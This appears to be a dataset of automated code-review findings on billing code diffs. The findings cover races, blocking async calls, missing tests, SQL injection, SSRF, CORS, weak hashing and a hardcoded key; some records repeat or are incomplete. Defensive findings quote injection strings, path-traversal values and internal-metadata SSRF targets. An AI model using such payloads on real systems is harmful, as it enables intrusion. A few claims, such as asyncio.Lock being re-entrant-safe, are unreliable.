findings.body: `apply_coupon` previously only read `coupon.amount`. It now dereferences `coupon.expires_at` unconditionally. Any existing caller or coupon object that omits the field raises `AttributeError`, and a coupon with `expires_at=None` raises `TypeError: '<' not supported between 'NoneType' and ...` rather than a meaningful billing error. findings.title: Blocking requests.get inside async function stalls the event loop
findings.body:
`fetch_plan_limits` is an `async def` but contains no `await`; it calls `requests.get(...)` synchronously. In an asyncio event loop this blocks the single loop thread for the whole duration of the HTTP round trip — up to the 5s timeout, and longer if DNS/connect stalls — so every other concurrently-served request is frozen, not just this one. The `async` keyword makes this worse than an honest sync function because callers `await` it and reasonably assume it yields.

Use the same pattern as `fetch_plan` on line 5: take an `httpx.AsyncClient` (or create one in an `async with` block) and `await client.get(...)`. If the synchronous library must be kept, wrap it in `await asyncio.to_thread(requests.get, ...)` so the loop is not held.

findings.title: Unencoded tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is inserted into the URL with an f-string and no encoding or format validation before `requests.get`. If the value reaches this function from a request parameter, a caller can supply `../admin`, `1?debug=true`, `1#`, or percent-encoded separators and reach endpoints on `billing.internal` other than `/limits/<id>` — an SSRF-flavoured path traversal against a service that is presumably not exposed externally and may therefore be lightly authenticated. `requests` also follows redirects by default, so a reachable redirecting endpoint on that host would extend the reach further.

Mitigations: validate `tenant_id` against its expected shape (e.g. UUID or digits) before use, or pass it through `urllib.parse.quote(str(tenant_id), safe="")`, and consider `allow_redirects=False`.

I cannot see the caller in this diff or in the retrieved context, so whether `tenant_id` is attacker-influenced is unconfirmed; the same pattern already exists on line 6 for the httpx client, so the fix is worth applying in both places.

findings.title: New blocking call in async function has no test coverage
findings.body: fetch_plan_limits introduces a synchronous `requests.get` call inside an async def, which would block the event loop. Nothing in this diff exercises this function, so a regression (or the blocking-call bug itself) would go unnoticed. Since no test file is included and no prior coverage pattern is visible for this module, this is a coverage gap worth flagging rather than a certainty about team policy.

findings.title: Bare except swallows KeyboardInterrupt and SystemExit
findings.body: `except:` catches `BaseException`, not just `Exception`, so a Ctrl-C or an interpreter shutdown (`SystemExit`, `GeneratorExit`) raised while `_client.send` is blocking on network I/O will be absorbed and turned into a `None` return. That makes the process unresponsive to interruption and can mask shutdown signals in whatever loop calls `push_metrics`. Narrow it to `except Exception:` — that still makes the push non-fatal, which is the stated intent, without capturing control-flow exceptions.

findings.title: No test covers push_metrics' new exception-swallowing behavior
findings.body: The change wraps _client.send in a bare except that returns None on any error. There is no test verifying that push_metrics returns None when send raises, nor one confirming it still returns the send result on success. If this logic were reverted or altered (e.g., accidentally re-raising, or catching the wrong thing), no test would fail.

findings.title: try_consume races on _counters: limit can be exceeded, updates lost
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` on line 15, yields control at `await asyncio.sleep(0)` on line 18, then writes the value it computed from the stale read on line 19. Two consequences on a reachable interleaving:

1. **Overshoot.** Two concurrent `try_consume(t, cost)` calls both read the same `current`, both pass the `current + cost > LIMIT` check, both suspend at line 18, and both then commit — total usage reaches `current + 2*cost`, which may exceed `LIMIT`. The limiter does not enforce its limit.
2. **Lost updates.** Line 19 assigns an absolute value rather than incrementing, so any `consume()` (line 10) or `try_consume()` that committed while this coroutine was suspended is silently overwritten and its cost discarded.

Note also that `consume` guards the same shared dict with `_lock` (line 9) but `try_consume` does not, so the lock provides no mutual exclusion between the two entry points at all.

Fix: hold `_lock` for the whole read-check-write, and re-read inside the lock rather than reusing the pre-await value:

```python
async def try_consume(tenant, cost):
    async with _lock:
        current = _counters.get(tenant, 0)
        if current + cost > LIMIT:
            return False
        _counters[tenant] = current + cost
        return True
```

If the `await` on line 18 is standing in for real I/O that must happen mid-transaction, the counter needs to be reserved before the await and released on failure, not recomputed after it.

_Also raised by the security agent:_ Rate limit bypass: unlocked check-then-act across await in try_consume

findings.title: No test covers try_consume's race-prone limit logic
findings.body: try_consume reads _counters, awaits, then writes back without holding _lock (unlike consume). Concurrent calls for the same tenant can both pass the check and both write, exceeding LIMIT. There is no test exercising concurrent calls to try_consume, nor even a basic single-call test verifying the True/False return and counter update. A test that spawns two concurrent try_consume calls near the limit and asserts the final counter does not exceed LIMIT would catch this bug; without it, the race can regress silently.

findings.body: lookup_user now returns a dict instead of a (name, email) tuple, but render_row in reports/weekly.py still does `name, email = lookup_user(user_id)`, which will raise (unpacking a 3-key dict yields 3 keys, not 2 values) or silently misbehave. findings.title: Mutable default argument accumulates state across calls
findings.body:
`attempted=[]` is evaluated once at function-definition time, so every call that omits the argument shares the same list object. Line 10 appends to it and line 11 returns it, so the second call returns its own failures plus every failure from all previous calls, and the list grows without bound for the process lifetime (also a slow memory leak in a long-running service). Callers that use the return value to decide what to re-send will re-send already-handled recipients.

findings.title: page_of_sorted drops the last record of every page

The slice end is `start + PAGE_SIZE - 1`, so each page returns at most `PAGE_SIZE - 1` items while `start` still advances by a full `PAGE_SIZE` per page. The record at index `page * PAGE_SIZE + PAGE_SIZE - 1` is never returned by any page, so a full paginated export silently loses one record out of every `PAGE_SIZE`. findings.title: File handle leaks on validation-failure and exception paths
findings.body:
`fh = open(path)` is only closed on the success path (line 16). The early `return None` on header mismatch (line 14) returns without closing, and any exception from `next(reader)` (line 12) or `list(reader)` (line 15) — e.g. a decode error on a mis-encoded file — escapes with the handle still open. Under CPython the handle is reclaimed non-deterministically by refcounting, and on PyPy/other implementations it can stay open indefinitely; repeated failed imports can exhaust file descriptors and, on Windows, keep the file locked against the caller retrying or deleting it.

Use the same `with open(path) as fh:` form already used by `read_rows` on line 5 and put the whole read inside it, which makes every exit path close the handle.

findings.title: Retry wraps non-idempotent charge(), risking duplicate charges
findings.body:
`@retry(attempts=3)` is applied to `charge_card`, which calls `billing.gateway.charge`. The gateway docstring states plainly that `charge` is NOT idempotent: each call creates a new charge. A retry is triggered by any failure the decorator considers transient — including a timeout or a connection reset that occurs *after* the gateway has already accepted and recorded the charge. In that case the retry creates a second (and possibly third) real charge for the same intent, and the caller gets no indication.

The gateway docstring also names the fix: it supports an `Idempotency-Key` header. Generate a stable key per logical charge attempt (e.g. an order/payment-intent id passed in by the caller, not a value generated inside the retried function body, which would differ per attempt) and thread it through `charge(...)` before enabling retries. If the key cannot be plumbed through now, drop the decorator from `charge_card` and let the caller decide, rather than silently retrying a money-moving call.

Note the contrast within this same file: `fetch_charge` on lines 5-7 wraps `get_charge`, which is documented as safe to repeat — that use of the decorator is correct and is not in question.

_Also raised by the security agent:_ Retry on non-idempotent charge can create duplicate charges

findings.title: Retry on non-idempotent operation lacks safety documentation

Applying `@retry(attempts=3)` to a non-idempotent operation is unsafe without an Idempotency-Key, but the gateway.py docstring indicates this header is available. The `charge_card` function must document whether it passes an Idempotency-Key to make retries safe, or explicitly warn that it does not. A caller reading `charge_card` will not know whether retry safety is handled or whether calling it multiple times could create duplicate charges.

There is no test in this diff (or apparently in the repo, based on retrieved context) that simulates a retryable failure and asserts the underlying charge call is invoked at most once, or that an idempotency key is passed through. As written, nothing would fail if this wrapper caused duplicate charges.

findings.title: Eviction clears the entry just written, so refresh may not stick
findings.body:
`get_tenant_fresh` stores the fetched tenant on line 10 and then, if the cache has grown past 1000 entries, discards the entire cache on line 12 — including the entry written one line earlier. The function still returns the fetched value, but any caller that calls `get_tenant_fresh(x)` and later reads through `get_tenant(x)` (line 5) will get `None` whenever the threshold trips, even though the refresh nominally succeeded. Every other cached tenant is dropped too, so one refresh at the boundary causes a cache-wide stampede.

Either evict before inserting, or evict selectively (e.g. drop the oldest entries / use an LRU or `OrderedDict`) so the freshly fetched value is retained.

findings.title: Function name `get_tenant_fresh` suggests read-only but mutates cache
findings.body: The function `get_tenant_fresh` uses the `get_*` naming convention, which conventionally indicates a read-only operation that retrieves data without side effects. However, this function mutates the cache by writing to `_CACHE[tenant_id]` (line 10) and clearing it when it exceeds size (line 12). A caller expecting standard `get_*` semantics—that the operation is safe to repeat, does not modify state, and has no side effects—will use this function incorrectly. Consider renaming to `fetch_tenant_fresh`, `refresh_tenant`, or `load_tenant_fresh` to signal that this operation mutates shared state.

If the write-through were wrong (e.g. wrong key, stale value written, off-by-one in the size check, or clearing at the wrong threshold), nothing would fail. Add a test that calls get_tenant_fresh and asserts the cache was updated with the fetched value, and a test that verifies the clear-on-overflow behavior at the boundary.

findings.title: Caller-supplied key can flush the whole tenant cache
findings.body:
`get_tenant_fresh` inserts under a caller-supplied `tenant_id` (line 10) and, once the map exceeds 1000 entries, discards *every* entry rather than evicting the one that overflowed (lines 11
dash12). If `tenant_id` is reachable from an external request, a caller can walk 1001 distinct (even nonexistent) ids and force a full flush, pushing all other tenants' traffic back onto `_fetch` 
dash a small-input, large-effect amplification against the backing store. Two cheap mitigations: validate that `tenant_id` corresponds to a tenant the caller may read before caching it, and replace the wholesale `clear()` with a bounded eviction policy (e.g. `collections.OrderedDict` + `popitem(last=False)`, or an explicit LRU) so one caller cannot evict everyone else's entries. Also note `_fetch` results are cached unconditionally, so a failed or `None` fetch for a bogus id still consumes a slot.

findings.title: origin "*" with credentials:true is rejected by browsers
findings.body:
The `cors` middleware with `origin: "*"` emits `Access-Control-Allow-Origin: *`. Per the Fetch spec, a user agent must fail any request made with `credentials: 'include'` when the allow-origin header is the literal `*`, even though `Access-Control-Allow-Credentials: true` is also present. So this configuration does not "open CORS" for the dashboard — credentialed (cookie/Authorization) requests from the browser will be blocked, and only non-credentialed requests will work, which is presumably not the intent given `credentials: true` was set deliberately.

Fix by reflecting the specific dashboard origin(s) instead of `*`, e.g. reuse the `ALLOWED` list pattern already used above (line 6) or pass a function/array of the dashboard origins. If the endpoint genuinely needs to be public and credential-free, drop `credentials: true` instead.

findings.title: Wildcard CORS origin combined with credentials on dashboard
findings.body:
`dashboardCors` sets `origin: "*"` together with `credentials: true`. Entry point is the attacker-controlled `Origin` request header on any route this middleware is mounted on; sink is the `Access-Control-Allow-Origin` / `Access-Control-Allow-Credentials` response headers.

Two outcomes, both bad:
- If the middleware emits the literal `*` alongside `Access-Control-Allow-Credentials: true`, browsers reject the response outright, so credentialed dashboard requests silently fail — a functional break disguised as a permissive config.
- If the middleware (or a later "fix" to make credentials work) reflects the incoming `Origin` instead, then any attacker-hosted page can issue credentialed cross-origin requests to the dashboard API with the victim's session cookies and read the responses — full authenticated data disclosure and state change from an arbitrary site.

Keep the existing pattern from line 6 and drive this off the `ALLOWED` allowlist (or an explicit dashboard-origin allowlist) rather than `*`. If the dashboard genuinely needs to be publicly readable, drop `credentials: true` and authenticate with a bearer token that the browser will not attach automatically.

Nothing in the diff exercises dashboardCors to confirm it behaves as intended (or fails loudly) when used. Since no other cors.ts config in this file appears to have tests either, this is a moderate-priority gap rather than a violation of existing convention.

findings.title: Live payments API key hardcoded in source, replacing env lookup
findings.body:
`ACMEPAY_SECRET_KEY` is a literal `acme_live_` prefixed credential committed to the repository and assigned directly to `acmepay.api_key`. The previous code read it from `os.environ["ACMEPAY_SECRET_KEY"]`, so this is a regression from a safe pattern to an unsafe one. Anyone with read access to the repo — plus anyone who ever obtains a clone, a CI cache, a build artifact, or the git history — holds a live payments credential that can move money.

Actions: (1) treat the key as compromised and rotate it at AcmePay immediately; (2) restore the `os.environ["ACMEPAY_SECRET_KEY"]` lookup (or a secrets-manager fetch); (3) purge the value from git history, since reverting the commit leaves it reachable; (4) consider a pre-commit secret scanner to prevent recurrence.

findings.body:
`tenant_of()` decodes with `options={"verify_signature": False}`, so the returned `tenant_id` is whatever the bearer put in the token body — no key, no signature, and (in PyJWT, disabling signature verification also defaults the other `verify_*` checks off) no `exp`/`nbf` enforcement. findings.title: Missing ownership check lets any user mutate others' payment methods
findings.body:
`update_payment_method` takes `pm_id` from the request, fetches the object with `PaymentMethod.get(pm_id)` (line 12) and writes `body["billing_name"]` to it, then persists with `pm.save()` (lines 13-14). findings.title: SQL injection: f-string interpolation in search_customers
findings.body:
`search_customers` composes its query with an f-string, placing `term` and `status` inside single-quoted SQL literals, then calls `execute(sql)` with no params. Any caller value containing a single quote breaks out of the literal: e.g. `status="x' OR '1'='1"` returns every row, and `term="%'; DROP TABLE customers; --"` reaches the driver as statement text.

Fix by parameterising, matching `get_customer` on line 5 and the contract documented in `billing/db.py`:

    sql = "SELECT * FROM customers WHERE name LIKE %s AND status = %s"
    return execute(sql, (f"%{term}%", status))

Note the wildcards belong in the *parameter value*, not the SQL, so the `%` characters stay outside the interpreter.

findings.title: search_customers interpolates values instead of passing params to execute
findings.body:
`execute` is documented as "Run a parameterised query. `params` must carry every caller value." and `get_customer` on line 5 follows that contract. `search_customers` instead formats `term` and `status` directly into the SQL text and calls `execute(sql)` with no params, so the values never go through the driver's quoting.

Concrete failures for reachable inputs:
- `term="O'Brien"` closes the string literal early and the query fails with a syntax error (and worse, lets arbitrary SQL through).
- `term=None` or `status=None` renders the literal text `'None'` rather than matching NULL/nothing, so the query silently returns the wrong rows instead of erroring.
- `term` containing `%` or `_` is treated as a LIKE metacharacter, quietly broadening the match.

Fix by parameterising and building the wildcards in the params, e.g. `execute("SELECT * FROM customers WHERE name LIKE %s AND status = %s", (f"%{term}%", status))`, escaping LIKE metacharacters in `term` if literal matching is intended.

There is no test in this diff exercising search_customers with any input (e.g. a value containing a quote or SQL metacharacter), so nothing would fail if this query were wrong or if it were later 'fixed' incorrectly. findings.title: SSRF: verify_endpoint fetches unvalidated caller-supplied URL
findings.body:
`verify_endpoint(url)` passes `url` straight into `requests.get` with no validation. The function immediately above in this same module parses the host and rejects anything not in `ALLOWED_HOSTS` before calling `requests.post`, so this new path is a bypass of the module's own established control.

Concretely, a caller who can reach this helper with a URL of their choosing can make the server issue GETs to addresses only the server can reach: `http://169.254.169.254/...` (cloud instance metadata), `http://127.0.0.1:<port>/` and RFC1918 ranges (internal admin panels, unauthenticated Redis/Elasticsearch HTTP interfaces). The returned `status_code` is enough of an oracle for internal host and port enumeration even without the body.

Recommended fix:
- Reuse the same host check as the send path: extract the `ALLOWED_HOSTS` validation into a shared helper and call it from `verify_endpoint` too, rather than duplicating or omitting it.
- Restrict the scheme to `http`/`https` explicitly — as written, `file://` and other `requests`-supported or adapter-registered schemes are reachable.
- Pass `allow_redirects=False` (or re-validate each hop). `requests` follows redirects by default, so even an allowlisted host can 302 the server onto an internal address, which would also weaken the existing check on line 10.

If `verify_endpoint` is only ever called with a URL that has already passed the allowlist, make that a precondition in code rather than in convention — the function as written is exported at module level and offers no hint that it is unsafe for raw input.

_Also raised by the correctness agent:_ verify_endpoint skips the ALLOWED_HOSTS check the send path enforces

findings.title: New verify_endpoint has no test coverage
findings.body: verify_endpoint is a new public function that performs a network GET against a caller-supplied URL, unlike the sibling function above it which validates the host against ALLOWED_HOSTS. No test in this diff exercises verify_endpoint at all, so there is nothing that would fail if it were removed, changed to hit an arbitrary host, or broken in some other way. Given the existing code validates hosts before making requests, a test should at minimum confirm expected behavior for allowed/disallowed hosts (or otherwise document that no such check exists).

findings.title: verify_endpoint raises instead of reporting failure for unreachable endpoints
findings.body: A function named `verify_endpoint` returning `status_code` reads as "tell me whether this endpoint works", but DNS failures, connection refusals and the 5s timeout all surface as `requests.exceptions.RequestException` rather than a return value. Any caller doing `if verify_endpoint(url) == 200:` will blow up on exactly the inputs verification exists to catch. Either catch `RequestException` and return a sentinel (e.g. `None`), or document that the function raises and make callers handle it.

findings.title: Public function `verify_endpoint` lacks contract documentation
findings.body: The new function `verify_endpoint` is exported from this module and accepts a URL parameter, but has no docstring describing what it does, what the return value means, what exceptions it may raise, or what constraints apply to the `url` parameter. A caller cannot determine safe usage from the signature alone — for instance, it is not clear whether the function validates or sanitizes the URL, what timeout behavior means, or whether a non-2xx status code raises an exception or returns normally.

findings.title: invoices public access block copied from the deliberately-public assets block
findings.body: `aws_s3_bucket_public_access_block.invoices` sets all four flags to `false`, which is an exact copy of the block for `assets` immediately above (lines 5-11) where being public is intentional. For `acme-customer-invoices` this leaves public ACLs and public bucket policies permitted and unignored, so any ACL or policy granting `*` access takes effect. findings.title: Public access block disabled on customer invoices bucket
findings.body:
`aws_s3_bucket_public_access_block.invoices` sets all four guards (`block_public_acls`, `block_public_policy`, `ignore_public_acls`, `restrict_public_buckets`) to `false` for `acme-customer-invoices`. findings.title: HMAC compared with == instead of hmac.compare_digest
findings.body:
`verify_acmepay` compares the computed HMAC digest to the attacker-supplied `header` with `==`. String equality in CPython short-circuits on the first differing byte, so the comparison time leaks a prefix-match length and lets an attacker forge a valid signature byte-by-byte. `verify_stripe`, three lines above and otherwise identical, correctly uses `hmac.compare_digest`. Change line 12 to `return hmac.compare_digest(expected, header)`.

A secondary consequence of the divergence: the two functions now behave differently on malformed input. `compare_digest` raises `TypeError` for a `None` or non-ASCII `header`, while `==` silently returns `False`. Any caller that relies on the stripe function's exception behaviour (or on both returning the same way) will see inconsistent handling between providers.

_Also raised by the security agent:_ Webhook signature compared with == instead of compare_digest

findings.title: New signature verification function has no test coverage
findings.body: verify_acmepay is a new security-relevant function (webhook signature verification) with no test exercising it. Given this is authentication-adjacent code, at minimum a test asserting correct verification for matching/non-matching signatures should be added.

findings.title: Reset path stores a hash format bcrypt verification cannot check
findings.body: `hash_password` returns a bcrypt modular-crypt string (`$2b$...`), which verification code almost certainly checks with `bcrypt.checkpw`. `hash_reset_password` returns a bare 32-char hex MD5 digest into what is evidently the same password column. `bcrypt.checkpw` against a non-bcrypt hash either returns False or raises `ValueError: invalid salt`, so a user who completes a reset would be locked out (or hit a 500) on the next login, depending on how the verifier handles the malformed hash. If the intent is a distinct short-lived reset token rather than a stored credential, it should be written to a separate field and verified by a separate code path; if it is a stored credential, it must go through `hash_password` so the formats match. I could not see the verification function or the reset caller, so the exact failure mode is inferred from the two hash formats in this file.

findings.title: Reset passwords hashed with unsalted MD5 instead of bcrypt
findings.body:
`hash_reset_password` derives a password hash with a single unsalted MD5 digest. MD5 is a fast, GPU-friendly hash with no work factor and no per-user salt, so any disclosure of the stored values (SQL injection, backup leak, insider access) lets an attacker recover the plaintext passwords at billions of guesses per second, and identical passwords produce identical digests across accounts. The module already does this correctly one function above: use `bcrypt.hashpw(raw.encode(), bcrypt.gensalt())` here too, ideally by simply delegating to `hash_password(raw)`, and plan a rehash-on-next-login migration for any values already written with MD5. If this value is intended as a short-lived reset *token* digest rather than a password, it should still not be derived from a user-chosen secret \u2014 generate the token with `secrets.token_urlsafe` and compare with `hmac.compare_digest`.

The `checksum` function's use of SHA-256 for file integrity on line 16 is appropriate and is not part of this finding.

A test would at minimum catch accidental behavior changes (e.g. algorithm swap, salting added/removed), and ideally would also flag the weak-hash choice via review policy. As it stands, nothing would fail if this function's implementation changed or regressed.

`test_renders_empty_invoice` calls `render(...)` and discards the result, so the only failure mode it can detect is an uncaught exception. findings.title: Patch target misses the name actually used by send_with_retry
findings.body:
`notify/sender.py` does `from notify.transport import deliver`, which binds `deliver` into the `notify.sender` module namespace at import time. findings.title: csv_rows joins raw values without calling csv_escape
findings.body: `csv_rows` builds each line with `",".join(str(r.get(c, "")) ...)` and never escapes the individual fields, while `csv_escape` — added in the same commit directly below it — exists precisely to quote values containing `,` or `"`. Any row value with an embedded comma (a free-text field, a formatted number like `1,234`) silently shifts every subsequent column, and an embedded quote produces unparseable output. Wrap the per-field conversion: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.

findings.title: New exporter functions ship with zero test coverage
findings.body: csv_rows, csv_escape, dump_streaming, dump_pretty, margins_for, and usable_width are all new public functions with real logic (index arithmetic, chunking, quoting rules, margin math) but no tests were added. If any of these had an off-by-one in chunk_size, wrong escaping logic, or incorrect margin math, nothing in the test suite would catch it. The repo already has a precedent (test_csv_header_matches_columns) for testing exporter output directly, so extending that pattern to these functions is the natural fix.

findings.title: csv_rows bypasses csv_escape; separator/newline injection into CSV output
findings.body:
`csv_rows` (line 7) interpolates each field with `str(r.get(c, ""))` and joins on `,` without calling the `csv_escape` helper defined a few lines below. Any field value that contains a comma silently becomes two columns, and a value containing `\n` or `\r\n` becomes two records — so whoever controls the row data controls the column count and record boundaries of the exported file, which is how downstream importers get fed forged rows.

Two changes:

1. Route every field through the escaper: `",".join(csv_escape(str(r.get(c, ""))) for c in columns)`.
2. Extend `csv_escape` to quote on newlines as well, e.g. `if any(ch in value for ch in (',', '\"', '\n', '\r'))`. Quoting only on comma and quote leaves record-splitting fully open even for callers that do escape.

The standard-library `csv` module (`csv.writer` with a `StringIO`) handles all of this and would remove the hand-rolled quoting entirely.

I cannot see the entry point for `rows` in this diff or in the retrieved context, so I cannot confirm the data is attacker-controlled in practice; the severity assumes an exporter fed by user-supplied record fields, which is the normal case for a reporting module.

If the token is issued at 23:59:59.999 UTC and the assertion evaluates at 00:00:00.000, the two dates differ and the test fails with no code defect. If `now` has no default in the signature this raises `TypeError`; if it does default to the wall clock, the assertion again depends on real time relative to the token's lifetime rather than on a controlled clock. findings.body: `raise CouponExpired(coupon.code)` puts the user-supplied coupon code into the exception argument. If an upstream handler renders exception text into an HTTP response or writes it to logs unescaped, the code value becomes an untrusted string in that sink (log-injection via newlines, or reflected content in an error page). Consider raising with a fixed message and attaching the code as a structured attribute (e.g. `CouponExpired(code=coupon.code)`) so callers opt in to exposing it. I cannot see the caller or the error-rendering path, so this is low-confidence and may already be handled.

findings.title: Blocking requests.get inside async fetch_plan_limits stalls event loop
findings.body:
`fetch_plan_limits` is an `async def` but contains no `await`; the only I/O is a synchronous `requests.get` with a 5-second timeout. When awaited, this coroutine runs entirely on the event loop thread and blocks every other task in the process for the duration of the billing call — up to the full 5s on a slow or hung upstream. The `async` signature makes this invisible at the call site, since callers will `await` it and reasonably assume it cooperates.

Use the same async transport as the function above it, e.g. `async with httpx.AsyncClient() as client: response = await client.get(...)`, or accept an `httpx.AsyncClient` parameter as `fetch_plan` does (line 5) so the connection pool is shared. If a synchronous client is genuinely required, wrap it with `await asyncio.to_thread(requests.get, ...)` so the blocking work leaves the loop thread.

findings.title: Unescaped tenant_id interpolated into internal billing URL path
findings.body:
`tenant_id` is f-string-interpolated straight into `https://billing.internal/limits/{tenant_id}`. `requests` normalises `..` segments before sending, so a value such as `../admin/keys` yields a request to `https://billing.internal/admin/keys` — reaching arbitrary endpoints on an internal service that is very likely unauthenticated because it is internal. A value containing `?` or `#` can likewise inject query parameters or truncate the path.

Fix by validating the shape of `tenant_id` (e.g. UUID / `^[A-Za-z0-9_-]+$`) before use, or by percent-encoding the segment with `urllib.parse.quote(str(tenant_id), safe='')`. Passing it as a query parameter via `params=` is also safe. The same pattern exists on the pre-existing line 6; if `tenant_id` is caller-influenced there, it deserves the same treatment.

findings.title: New async function with blocking I/O has no test coverage
findings.body: fetch_plan_limits is an async function that calls requests.get synchronously, which blocks the event loop. No test exists for this function, so a regression (or the blocking-call defect itself) would go undetected. A test that mocks the sync call and verifies it returns parsed JSON, or better, an integration/lint check that would flag blocking calls inside async functions, would catch this.

findings.title: Bare except swallows KeyboardInterrupt and SystemExit
findings.body: `except:` with no exception class catches `BaseException`, so a Ctrl-C (`KeyboardInterrupt`) or an interpreter shutdown (`SystemExit`) raised while `_client.send` is blocking on network I/O is caught and converted into `return None`. That makes the process ignore shutdown signals during pushes, which is the opposite of "non-fatal for metrics errors". Narrow this to `except Exception:` so control-flow exceptions propagate. Also record the failure (`logger.exception(...)`) rather than discarding it entirely — as written, a permanently broken metrics client is invisible.

findings.title: No test verifies push_metrics swallows exceptions and returns None
findings.body: The change alters push_metrics to catch all exceptions (including KeyboardInterrupt/SystemExit) and return None instead of propagating. There is no test in this diff exercising the case where _client.send raises, so nothing would catch a regression if this behavior were reverted, changed to re-raise, or changed to swallow a different set of exceptions.

findings.title: try_consume checks and updates shared counters without holding _lock
findings.body:
`try_consume` reads `_counters.get(tenant, 0)` at line 15, yields control at line 18 (`await asyncio.sleep(0)`), and then writes `_counters[tenant] = current + cost` at line 19 based on the now-stale `current`. Two effects follow:

1. Limit bypass: N concurrent callers can all observe the same `current`, all pass the `current + cost > LIMIT` check, and all return `True`, admitting up to N*cost over the limit.
2. Lost update: the write is an absolute assignment from a stale read, so any increment applied by `consume` (line 10) or by another `try_consume` during the await is overwritten and discarded — the counter can go *down*, permanently under-counting usage.

The existing `consume` already guards the same dictionary with `async with _lock`, so the lock exists and is the established pattern here. Wrap the whole read-check-write in `async with _lock:` (and prefer an in-place increment, e.g. `_counters[tenant] = _counters.get(tenant, 0) + cost`, rather than assigning from a value read earlier). Note that holding the lock across the `await` is fine since `asyncio.Lock` is re-entrant-safe for a single waiter chain, but if the await is only a scheduling hint it should simply be removed.

_Also raised by the security agent:_ Rate limit bypassable: unlocked check-then-act across an await

findings.title: try_consume's check-then-act race is untested
findings.body: try_consume reads _counters (line 15), awaits asyncio.sleep(0) (line 18), then writes _counters (line 19) without holding _lock, unlike consume() which does hold the lock. There is no test in this diff exercising concurrent calls to try_consume that would reveal that two coroutines can both pass the limit check before either writes, allowing the tenant's counter to exceed LIMIT. Since no test file is included, this race condition and any incorrect limit enforcement under concurrency would go undetected.

findings.title: Return shape change breaks tuple-unpacking caller in reports/weekly.py
